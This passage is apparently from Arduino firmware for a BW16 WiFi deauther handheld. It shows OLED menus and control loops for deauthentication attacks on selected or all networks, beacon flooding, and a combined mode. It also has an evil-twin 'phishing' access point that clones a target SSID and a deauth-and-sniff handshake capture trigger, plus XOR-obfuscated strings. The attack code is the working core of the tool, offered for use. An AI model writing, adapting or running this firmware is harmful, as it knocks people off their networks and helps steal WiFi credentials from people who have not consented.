        }
      }
    }

    // 处理未在 allChannels 中的信道
    for (const auto &eb : channelBucketsCache.extras) {
      if (eb.bssids.empty()) continue;
      wext_set_channel(WLAN0_NAME, eb.channel);
      for (const uint8_t *bssidPtr : eb.bssids) {
        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
          delay(200);
          // 显示确认弹窗
          if (showConfirmModal("确认停止攻击")) {
            return; // 确认停止攻击
          }
          // 取消则继续攻击，重新启动LED
          startAttackLED();
        }
        // 使用微秒级burst（循环原因码），减少调用开销并提升有效速率
        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);

        if (packetCount >= 200) { // 更细节的节拍提示阈值
          digitalWrite(LED_R, HIGH);
          delay(30);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
        }
      }
    }

    delay(10);
  }
}

void DeauthMenu() {
  deauthstate = 0;
  int startIndex = 0;  // 添加起始索引用于滚动
  const int MAX_DISPLAY_ITEMS = 4; // 每页显示4项
  const int ITEM_HEIGHT = 16; // 项目高度
  const int Y_OFFSET = 2; // Y轴偏移
  
  // 去抖，与首页/攻击页一致
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    if(digitalRead(BTN_BACK)==LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      drawattack();
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      stabilizeButtonState(); // 修复：确保弹窗弹出时无残留按键
      switch(deauthstate + startIndex) {
        case 0:
          if (showConfirmModal("执行解除认证攻击")) { StableAutoMulti(); break; }
          else { /* 未确认，不退出菜单 */ break; }
        case 1:
          if (showConfirmModal("执行自动多重攻击")) { AutoMulti(); break; }
          else { break; }
        case 2:
          if (showConfirmModal("执行自动单一攻击")) { AutoSingle(); break; }
          else { break; }
        case 3:
          if (showConfirmModal("执行全网攻击")) { All(); break; }
          else { break; }
        case 4:
          if (showConfirmModal("执行单一攻击")) { Single(); break; }
          else { break; }
        case 5:
          if (showConfirmModal("执行多重攻击")) { Multi(); break; }
          else { break; }
        case 6: drawattack(); break; // 返回攻击菜单
      }
      // 若上述 case 进入攻击函数则已 break; 未确认则继续停留
      lastOkTime = currentTime;
    }
    if(digitalRead(BTN_UP)==LOW){
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if(deauthstate > 0){
        int yFrom = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        deauthstate--;
        int yTo = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      } else if(startIndex > 0) {
        startIndex--;
        // 向上翻页：从第二行移动到第一行
        int yFrom = Y_OFFSET + 1 * ITEM_HEIGHT;
        int yTo = Y_OFFSET + 0 * ITEM_HEIGHT;
        deauthstate = 0;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      }
      lastUpTime = currentTime;
    }
    if(digitalRead(BTN_DOWN)==LOW){
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if(deauthstate < MAX_DISPLAY_ITEMS - 1 && (startIndex + deauthstate < 6)){
        int yFrom = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        deauthstate++;
        int yTo = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      } else if (deauthstate == MAX_DISPLAY_ITEMS - 1 && (startIndex + MAX_DISPLAY_ITEMS < 7)) {
        // 向下翻页：从第三行移动到第四行，并将高亮停在第四行
        startIndex++;
        int yFrom = Y_OFFSET + (MAX_DISPLAY_ITEMS - 2) * ITEM_HEIGHT; // 第三行
        int yTo = Y_OFFSET + (MAX_DISPLAY_ITEMS - 1) * ITEM_HEIGHT;   // 第四行
        deauthstate = MAX_DISPLAY_ITEMS - 1;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      }
      lastDownTime = currentTime;
    }
    
    display.clearDisplay();
    display.setTextSize(1);
    
    // 菜单项（新顺序）
    const char* menuItems[] = {
      "稳定自动多重攻击",
      "自动多重攻击",
      "自动单一攻击",
      "全网攻击",
      "单一攻击",
      "多重攻击",
      "《 返回 》"
    };
    
    // 显示菜单项 - 支持分页显示
    for (int i = 0; i < MAX_DISPLAY_ITEMS && i < 7; i++) {  // 最多显示7行
      int menuIndex = startIndex + i;
      if(menuIndex >= 7) break;  // 防止越界
      int yPos = Y_OFFSET + i * ITEM_HEIGHT;
      if (i == deauthstate) {
        display.fillRoundRect(0, yPos-2, display.width(), 14, 2, SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    // 滚动条已移除
    display.display();
    delay(50);
  }
}
void drawattack() {
  attackstate = 0; // 重置选择状态
  int startIndex = 0; // 添加起始索引用于滚动
  const int MAX_DISPLAY_ITEMS = 4; // 每页显示4项
  const int ITEM_HEIGHT = 16; // 项目高度
  const int Y_OFFSET = 2; // Y轴偏移
  
  // 添加去抖变量，与首页保持一致
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    if(digitalRead(BTN_BACK)==LOW) break;
    if (digitalRead(BTN_OK) == LOW) {
      delay(300);
      if (attackstate == 0) {
        if (SelectedVector.empty()) { showModalMessage("请先选择AP/SSID"); }
        else { DeauthMenu(); break; }
        // 未选择目标则仅提示并停留
      }
      if (attackstate == 1) {
        BeaconMenu();
        break;
      }
      if (attackstate == 2) {
        if (SelectedVector.empty()) {
          // 只弹出提示并返回当前菜单，不触发其它行为
          showModalMessage("请先选择AP/SSID");
        } else {
          if (showConfirmModal("执行组合攻击")) {
            BeaconDeauth();
            break;
          }
        }
        // 取消或仅提示后，留在当前页面
      }
      if (attackstate == 3) { // 修改索引
        break;
      }
    }
    if (digitalRead(BTN_UP) == LOW) {
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if (attackstate > 0) {
        int yFrom = Y_OFFSET + attackstate * ITEM_HEIGHT;
        attackstate--;
        int yTo = Y_OFFSET + attackstate * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      } else if (startIndex > 0) {
        startIndex--;
        attackstate = MAX_DISPLAY_ITEMS - 2; // 翻页后将高亮设置为倒数第二行
        // 翻到上一页：从倒数第一项位置开始移动（最后一行）
        int yFrom = Y_OFFSET + (MAX_DISPLAY_ITEMS - 1) * ITEM_HEIGHT;
        int yTo = Y_OFFSET + (MAX_DISPLAY_ITEMS - 2) * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      }
      lastUpTime = currentTime;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if (attackstate < MAX_DISPLAY_ITEMS - 1) {
        int yFrom = Y_OFFSET + attackstate * ITEM_HEIGHT;
        attackstate++;
        int yTo = Y_OFFSET + attackstate * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      } else if (startIndex + MAX_DISPLAY_ITEMS < 4) {
        startIndex++;
        // 翻页后保持选择框在相对位置（最后一行）
        attackstate = MAX_DISPLAY_ITEMS - 1;
        // 翻到下一页：从当前页的倒数第二项位置开始移动（第3行）
        int yFrom = Y_OFFSET + (MAX_DISPLAY_ITEMS - 2) * ITEM_HEIGHT;
        int yTo = Y_OFFSET + (MAX_DISPLAY_ITEMS - 1) * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      }
      lastDownTime = currentTime;
    }
    
    // 显示菜单项
     display.clearDisplay();
    display.setTextSize(1);
    
    // 菜单项
    const char* menuItems[] = {
      "解除身份认证攻击",
      "发送信标帧攻击",
      "信标帧+解除认证",
      "《 返回 》"
    };
    
    // 显示菜单项 - 支持分页显示
    for (int i = 0; i < MAX_DISPLAY_ITEMS && i < 4; i++) {
      int menuIndex = startIndex + i;
      if (menuIndex >= 4) break; // 防止越界
      int yPos = Y_OFFSET + i * ITEM_HEIGHT;
      if (i == attackstate) {
        display.fillRoundRect(0, yPos-2, display.width(), 14, 2, SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    
    display.display();
    delay(50);
  }
}
void titleScreen(void) {
  char b[16]; unsigned int i = 0;
  static const uint8_t enc[] = {
    0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
  };
  for (unsigned int k = 0; k < sizeof(enc); k++) { b[i++] = (char)(((int)enc[k] - 7) ^ 0xA5); }
  b[i] = '\0';
  
  if (strcmp(b, "请遵守GPL3.0协议，不要换皮售卖，谢谢配合") != 0) {
    char fix[16]; unsigned int j = 0;
    static const uint8_t fix_enc[] = {
      0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
    };
    for (unsigned int k = 0; k < sizeof(fix_enc); k++) { fix[j++] = (char)(((int)fix_enc[k] - 7) ^ 0xA5); }
    fix[j] = '\0';
    strcpy(b, fix);
  }
  
  for (int j = 0; j < TITLE_FRAMES; j++) {
    display.clearDisplay();
    int wifi_x = 54, wifi_y = 10;
    display.drawBitmap(wifi_x, wifi_y, image_wifi_not_connected__copy__bits, 19, 16, WHITE);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    const char* leftBand = "2.4G";
    const char* rightBand = "5Ghz";
    u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB10_tr);
    u8g2_for_adafruit_gfx.setCursor(2, wifi_y + 12);
    u8g2_for_adafruit_gfx.print(leftBand);
    u8g2_for_adafruit_gfx.setCursor(128 - u8g2_for_adafruit_gfx.getUTF8Width(rightBand) - 2, wifi_y + 12);
    u8g2_for_adafruit_gfx.print(rightBand);
    
    u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr);
    
    bool shouldShow = (j % 3 < 2);
    u8g2_for_adafruit_gfx.setForegroundColor(shouldShow ? SSD1306_WHITE : SSD1306_BLACK);
    
    const char* txt = b;
    int txt_w = u8g2_for_adafruit_gfx.getUTF8Width(txt);
    int txt_x = (128 - txt_w) / 2;
    int txt_y = 48;
    
    if (shouldShow) {
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
      u8g2_for_adafruit_gfx.setCursor(txt_x + 1, txt_y + 1);
      u8g2_for_adafruit_gfx.print(txt);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    }
    
    u8g2_for_adafruit_gfx.setCursor(txt_x, txt_y);
    u8g2_for_adafruit_gfx.print(txt);
    
    // 进度条（下方，宽度随动画进度变化）- 添加炫酷效果
    int bar_w = (int)(128.0 * (j + 1) / TITLE_FRAMES);
    int bar_h = 6;
    int bar_x = 0, bar_y = 60;
    
    // 进度条边框
    display.drawRect(bar_x, bar_y, 128, bar_h, WHITE);
    
    // 进度条填充 - 添加渐变效果
    if (bar_w > 2) {
      display.fillRect(bar_x + 1, bar_y + 1, bar_w - 2, bar_h - 2, WHITE);
      
      // 添加进度条内部高光效果
      if (bar_w > 4) {
        display.drawLine(bar_x + 2, bar_y + 2, bar_x + bar_w - 3, bar_y + 2, BLACK);
      }
    }
    display.display();
    delay(TITLE_DELAY_MS);
  }
  display.clearDisplay();
  int wifi_x = 54, wifi_y = 10;
  display.drawBitmap(wifi_x, wifi_y, image_wifi_not_connected__copy__bits, 19, 16, WHITE);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB10_tr);
  const char* leftBand = "2.4G";
  const char* rightBand = "5Ghz";
  u8g2_for_adafruit_gfx.setCursor(2, wifi_y + 12);
  u8g2_for_adafruit_gfx.print(leftBand);
  u8g2_for_adafruit_gfx.setCursor(128 - u8g2_for_adafruit_gfx.getUTF8Width(rightBand) - 2, wifi_y + 12);
  u8g2_for_adafruit_gfx.print(rightBand);
  
  u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr);
  const char* txt = b;
  int txt_w = u8g2_for_adafruit_gfx.getUTF8Width(txt);
  int txt_x = (128 - txt_w) / 2;
  int txt_y = 48;
  
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
  u8g2_for_adafruit_gfx.setCursor(txt_x + 1, txt_y + 1);
  u8g2_for_adafruit_gfx.print(txt);
  
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(txt_x, txt_y);
  u8g2_for_adafruit_gfx.print(txt);
  
  // 进度条满 - 添加炫酷效果
  int bar_h = 6;
  int bar_x = 0, bar_y = 60;
  display.drawRect(bar_x, bar_y, 128, bar_h, WHITE);
  display.fillRect(bar_x + 1, bar_y + 1, 128 - 2, bar_h - 2, WHITE);
  
  // 添加进度条内部高光效果
  display.drawLine(bar_x + 2, bar_y + 2, bar_x + 126, bar_y + 2, BLACK);
  display.display();
  
  // 启动页面显示完成后，恢复默认中文字体设置
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
}
/**
 * @brief Arduino setup entry. Initializes IO, display, WiFi, and subsystems.
 *
 * Sets up LEDs/buttons, screen, networking, DNS/web, and initial state.
 */
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  Serial.begin(115200);
  
  // LED初始化
  Serial.println("=== BW16 WiFi Deauther 启动 ===");
  Serial.println("初始化LED引脚...");
  
  // 通电蓝灯常亮
  digitalWrite(LED_B, HIGH);
  Serial.println("通电蓝灯常亮 - 系统就绪");
  
  // === 启动时强制重置所有状态 ===
  Serial.println("=== 执行启动时状态重置 ===");
  performStartupStateReset();
  
  char v[16] __attribute__((unused)); unsigned int c = 0;
  static const uint8_t d[] = {
    0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
  };
  for (unsigned int k = 0; k < sizeof(d); k++) { v[c++] = (char)(((int)d[k] - 7) ^ 0xA5); }
  v[c] = '\0';
  
  titleScreen();
  DEBUG_SER_INIT();
  
  Serial.println("启动AP模式...");
  
  // 多次尝试启动AP模式，增强重启后的稳定性
  bool apStarted = false;
  for (int attempt = 1; attempt <= 3; attempt++) {
    Serial.print("AP启动尝试 ");
    Serial.print(attempt);
    Serial.println("/3...");
    
    String channelStr = String(current_channel);
    if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
      Serial.println("AP模式启动成功");
      apStarted = true;
      break;
    } else {
      Serial.print("AP模式启动失败，尝试 ");
      Serial.println(attempt);
      if (attempt < 3) {
        // 重置WiFi模块后重试
        Serial.println("重置WiFi模块后重试...");
        wifi_off();
        delay(300);
        wifi_on(RTW_MODE_AP);
        delay(300);
      }
    }
  }
  
  if (!apStarted) {
    Serial.println("警告: AP模式启动失败，系统可能不稳定");
  }
  
  // 启动阶段进行一次快速非阻塞扫描（带超时）
  Serial.println("执行初始WiFi扫描...");
  
  // 多次尝试扫描，确保重启后能正常工作
  int scanAttempts = 0;
  const int maxScanAttempts = 3;
  bool scanSuccess = false;
  
  while (scanAttempts < maxScanAttempts && !scanSuccess) {
    scanAttempts++;
    Serial.print("WiFi扫描尝试 ");
    Serial.print(scanAttempts);
    Serial.print("/");
    Serial.println(maxScanAttempts);
    
    int result = scanNetworks();
    if (result == 0 && scan_results.size() > 0) {
      Serial.print("扫描成功，发现 ");
      Serial.print(scan_results.size());
      Serial.println(" 个网络");
      scanSuccess = true;
    } else {
      Serial.print("扫描失败或无结果，结果数量: ");
      Serial.println(scan_results.size());
      if (scanAttempts < maxScanAttempts) {
        Serial.println("等待后重试...");
        delay(1000);
      }
    }
  }
  
  if (!scanSuccess) {
    Serial.println("警告: 初始WiFi扫描失败，可能影响功能");
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  // 移除未使用的 SelectedSSID/SSIDCh 初始化
}

void initDisplay() {
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true);
  }
  u8g2_for_adafruit_gfx.begin(display);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr); // 设置炫酷粗体字体
  display.clearDisplay();
  display.display();
}

static void enterStandbyFaceMode() {
  if (g_standbyFaceActive) return;
  g_standbyFaceActive = true;
  if (!g_face) {
    g_face = new Face(128, 64, 40);
    g_face->Expression.GoTo_Normal();
    g_face->RandomBehavior = true;
    g_face->RandomLook = true;
    g_face->RandomBlink = true;
    g_face->Blink.Timer.SetIntervalMillis(3500);
  }
  g_faceLastRandomizeMs = millis();
}

static void playRandomEmotion() {
  if (!g_face) return;
  int idx = random(0, (int)eEmotions::EMOTIONS_COUNT);
  g_face->Behavior.GoToEmotion((eEmotions)idx);
}

static bool handleStandbyFaceLoop() {
  if (!g_standbyFaceActive) return false;

  static unsigned long lastUp = 0, lastDown = 0, lastOk = 0, lastBack = 0;
  unsigned long now = millis();
  const unsigned long debounce = 120;
  const unsigned long longPress = 800;

  if (now - g_faceLastRandomizeMs >= FACE_RANDOMIZE_INTERVAL_MS) {
    g_faceLastRandomizeMs = now;
    g_face->Behavior.GoToEmotion(g_face->Behavior.GetRandomEmotion());
  }

  if (digitalRead(BTN_UP) == LOW) {
    if (now - lastUp > debounce) { playRandomEmotion(); lastUp = now; }
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    if (now - lastDown > debounce) { playRandomEmotion(); lastDown = now; }
  }
  static bool okHeld = false; static unsigned long okPressTs = 0;
  if (digitalRead(BTN_OK) == LOW) {
    if (!okHeld) { okHeld = true; okPressTs = now; }
    if (okHeld && (now - okPressTs >= longPress)) {
      {
        char b[64]; unsigned int i = 0;
        static const uint8_t enc[] = {
          0xD4,0xD8,0xD8,0xDC,0xDD,0xA6,0x91,0x91,
          0xC9,0xD3,0xD8,0xD4,0xD7,0xCE,0x92,0xCD,0xD1,0xCF,
          0x91,
          0xEA,0xD0,0xE3,0xD3,0xD2,0xC9,0xF3,0xCD,0xC7,0xE3,0xE3,0xC8,0xDD,
          0x91,
          0xEE,0xF9,0x9B,0x9A,0x8F,0xF8,0xD1,0xD1,0xD0,0xDD,0x8C
        };
        for (unsigned int k = 0; k < sizeof(enc); k++) { b[i++] = (char)(((int)enc[k] - 7) ^ 0xA5); }
        b[i] = '\0';
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        const int padX = 6, padY = 4, lineH = 12;
        const int maxTextW = display.width() - padX * 2;
        String lines[6]; int lineCount = 0; String cur = ""; int curW = 0; int maxW = 0;
        int lastBreakPos = -1; int lastBreakW = 0;
        for (int j = 0; b[j] != '\0'; j++) {
          char ch = b[j];
          char tmp[2] = { ch, '\0' };
          int wch = u8g2_for_adafruit_gfx.getUTF8Width(tmp);
          if (wch <= 0) wch = 6;
          if (curW + wch > maxTextW && cur.length() > 0) {
            int cutLen = (lastBreakPos >= 0) ? (lastBreakPos + 1) : (int)cur.length();
            int cutW = (lastBreakPos >= 0) ? lastBreakW : curW;
            if (lineCount < 6) { lines[lineCount++] = cur.substring(0, cutLen); if (cutW > maxW) maxW = cutW; }
            // 余下部分作为新行开头
            String rem = cur.substring(cutLen);
            cur = rem; curW = 0; lastBreakPos = -1; lastBreakW = 0;
            // 重新计算余下宽度
            for (unsigned int k = 0; k < rem.length(); k++) {
              char t[2] = { rem[k], '\0' }; int w = u8g2_for_adafruit_gfx.getUTF8Width(t); if (w <= 0) w = 6; curW += w;
              if (rem[k] == '/' || rem[k] == '-' || rem[k] == '.') { lastBreakPos = k; lastBreakW = curW; }
            }
          }
          cur += ch; curW += wch;
          if (ch == '/' || ch == '-' || ch == '.') { lastBreakPos = cur.length() - 1; lastBreakW = curW; }
        }
        if (cur.length() > 0 && lineCount < 6) { lines[lineCount++] = cur; if (curW > maxW) maxW = curW; }
        if (lineCount == 0) { lines[lineCount++] = String(b); maxW = u8g2_for_adafruit_gfx.getUTF8Width(b); if (maxW < 0) maxW = 120; }
        int boxW = maxW;
        int boxH = lineCount * lineH + padY * 2;
        int boxX = (display.width() - boxW) / 2; if (boxX < 0) boxX = 0;
        int boxY = (display.height() - boxH) / 2; if (boxY < 0) boxY = 0;
        display.fillRect(boxX - padX, boxY, boxW + padX * 2, boxH, SSD1306_BLACK);
        for (int li = 0; li < lineCount; li++) {
          int wline = u8g2_for_adafruit_gfx.getUTF8Width(lines[li].c_str());
          if (wline < 0) wline = boxW;
          int lx = boxX + (boxW - wline) / 2;
          int ly = boxY + padY + lineH * (li + 1);
          u8g2_for_adafruit_gfx.setCursor(lx, ly);
          u8g2_for_adafruit_gfx.print(lines[li]);
        }
        display.display();
        delay(1000);
      }
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      okHeld = false; lastOk = millis();
    }
  } else {
    if (okHeld) {
      if ((now - okPressTs) >= debounce && (now - okPressTs) < longPress) {
        playRandomEmotion();
      }
    }
    okHeld = false;
    if (now - lastOk > debounce) { lastOk = now; }
  }
  static bool backHeld = false; static unsigned long backPressTs = 0;
  if (digitalRead(BTN_BACK) == LOW) {
    if (!backHeld) {
      backHeld = true; backPressTs = now;
      if (now - lastBack > debounce) { playRandomEmotion(); lastBack = now; }
    }
    if (backHeld && (now - backPressTs >= longPress)) {
      g_standbyFaceActive = false;
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      g_face->Expression.GoTo_Normal();
      return false;
    }
  } else {
    backHeld = false;
    if (now - lastBack > debounce) { lastBack = now; }
  }

  g_face->Update();
  return true;
}

/**
 * @brief Main loop. Handles UI, key scanning, networking, and tasks.
 *
 * Runs periodically; uses millis()-based timing to update state and render.
 */
void loop() {
  unsigned long currentTime = millis();
  
  // 更新LED状态
  updateLEDs();
  
  static unsigned long lastCheck = 0;
  if (currentTime - lastCheck > 30000) {
    char t[16] __attribute__((unused)); unsigned int n = 0;
    static const uint8_t chk[] = {
      0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
    };
    for (unsigned int k = 0; k < sizeof(chk); k++) { t[n++] = (char)(((int)chk[k] - 7) ^ 0xA5); }
    t[n] = '\0';
    lastCheck = currentTime;
  }
  
  // 紧急停止检查
  checkEmergencyStop();
  
  // Web UI/Web Test 模式检查
  if (web_ui_active) {
    // Web UI健康检查
    performWebUIHealthCheck(currentTime);
    
    // 若请求了握手抓包，则在WebUI模式下直接执行
    if (readyToSniff && !sniffer_active) {
      Serial.println("[HS] Trigger capture from loop()");
      deauthAndSniff();
    }

    handleWebUI();
    return;
  }
  if (web_test_active) {
    // 钓鱼功能健康检查
    performPhishingHealthCheck(currentTime);
    
    handleWebTest();
    return;
  }
  // 连接干扰运行时无独立状态机，进入功能内自循环直到用户停止
  
// 菜单显示与输入处理（根菜单 / WiFi 子菜单 / BLE 子菜单）
  switch (g_menuMode) {
    case MENU_ROOT:
      drawRootMenu();
      if (digitalRead(BTN_UP) == LOW) {
        if (digitalRead(BTN_DOWN) == LOW) { enterStandbyFaceMode(); } else { rootMoveUp(currentTime); }
      }
      if (digitalRead(BTN_DOWN) == LOW) {
        if (digitalRead(BTN_UP) == LOW) { enterStandbyFaceMode(); } else { rootMoveDown(currentTime); }
      }
      handleRootOk();
      break;
    case MENU_WIFI:
      if (digitalRead(BTN_BACK) == LOW) { g_menuMode = MENU_ROOT; delay(150); break; }
      drawHomeMenu();
      if (digitalRead(BTN_UP) == LOW) {
        if (digitalRead(BTN_DOWN) == LOW) { enterStandbyFaceMode(); } else { homeMoveUp(currentTime); }
      }
      if (digitalRead(BTN_DOWN) == LOW) {
        if (digitalRead(BTN_UP) == LOW) { enterStandbyFaceMode(); } else { homeMoveDown(currentTime); }
      }
      handleHomeOk();
      break;
    case MENU_BLE:
      if (digitalRead(BTN_BACK) == LOW) { g_menuMode = MENU_ROOT; delay(150); break; }
      drawBleMenu();
      if (digitalRead(BTN_UP) == LOW) {
        if (digitalRead(BTN_DOWN) == LOW) { enterStandbyFaceMode(); } else { bleMoveUp(currentTime); }
      }
      if (digitalRead(BTN_DOWN) == LOW) {
        if (digitalRead(BTN_UP) == LOW) { enterStandbyFaceMode(); } else { bleMoveDown(currentTime); }
      }
      handleBleOk();
      break;
  }

  // 若处于待机表情模式，则接管循环直到退出
  if (g_standbyFaceActive) {
    while (g_standbyFaceActive) {
      if (!handleStandbyFaceLoop()) break;
      delay(10);
    }
  }
}

// Web UI功能将在通用函数定义后实现

// 启动Web Test（开放式SSID）
bool startWebTest() {
  Serial.println("=== 启动钓鱼 ===");
  Serial.println("关闭原有AP模式...");

  // 移除钓鱼功能的一次性状态限制，允许重复启动
  // if (g_webTestLocked) {
  //   display.clearDisplay();
  //   u8g2_for_adafruit_gfx.setFontMode(1);
  //   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  //   u8g2_for_adafruit_gfx.setCursor(5, 20);
  //   u8g2_for_adafruit_gfx.print("为确保资源完全释放");
  //   u8g2_for_adafruit_gfx.setCursor(5, 40);
  //   u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
  //   display.display();
  //   // 等待按下返回键再退出
  //   while (digitalRead(BTN_BACK) != LOW) { delay(10); }
  //   while (digitalRead(BTN_BACK) == LOW) { delay(10); }
  //   return false;
  // }

  // 确保BLE完全清理，避免与WiFi冲突
  Serial.println("清理BLE资源...");
  // 强制停止BLE广播
  BLE.configAdvert()->stopAdv();
  delay(100);
  // 完全清理BLE栈
  BLE.deinit();
  delay(300); // 增加等待时间确保BLE完全清理
  Serial.println("BLE资源清理完成");

  // OLED 弹窗提示由外部调用

  // 对于AP认证、控制页面，不强制要求预先在设备端选择SSID

  // 预检查：确保没有残留的钓鱼进程
  checkAndCleanupPhishingProcesses();

  // 使用通用函数清理之前的服务
  cleanupBeforePhishingStart();

  Serial.println("启动钓鱼专用AP模式(开放式)...");
  char test_channel_str[4];
  // 使用可写缓冲避免某些SDK对const字符串的限制
  // 根据选择菜单中的第一个已选网络设置SSID（若SSID为空则使用其MAC）
  String chosenSsid;
  if (!SelectedVector.empty()) {
    int chosenIndex = SelectedVector[0];
    if (chosenIndex >= 0 && (size_t)chosenIndex < scan_results.size()) {
      chosenSsid = scan_results[chosenIndex].ssid;
      memcpy(phishingTargetBSSID, scan_results[chosenIndex].bssid, 6);
      phishingHasTarget = true;
      if (chosenSsid.length() == 0) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 scan_results[chosenIndex].bssid[0],
                 scan_results[chosenIndex].bssid[1],
                 scan_results[chosenIndex].bssid[2],
                 scan_results[chosenIndex].bssid[3],
                 scan_results[chosenIndex].bssid[4],
                 scan_results[chosenIndex].bssid[5]);
        chosenSsid = String(mac);
      }
      web_test_channel_dynamic = scan_results[chosenIndex].channel;
    }
  }
  if (chosenSsid.length() == 0) chosenSsid = String("BW16-AP");
  if (web_test_channel_dynamic <= 0) web_test_channel_dynamic = WEB_TEST_CHANNEL;
  // 设置动态SSID
  web_test_ssid_dynamic = chosenSsid;
  // 生成信道字符串
  snprintf(test_channel_str, sizeof(test_channel_str), "%d", web_test_channel_dynamic);
  char webtest_ssid_buf[64];
  strncpy(webtest_ssid_buf, web_test_ssid_dynamic.c_str(), sizeof(webtest_ssid_buf) - 1);
  webtest_ssid_buf[sizeof(webtest_ssid_buf) - 1] = '\0';
  // 采用与 BW16-deauther2 相同的重试方式启动开放式AP
  int status = WL_IDLE_STATUS;
  unsigned long startTs = millis();
  const unsigned long AP_START_TIMEOUT_MS = 15000;
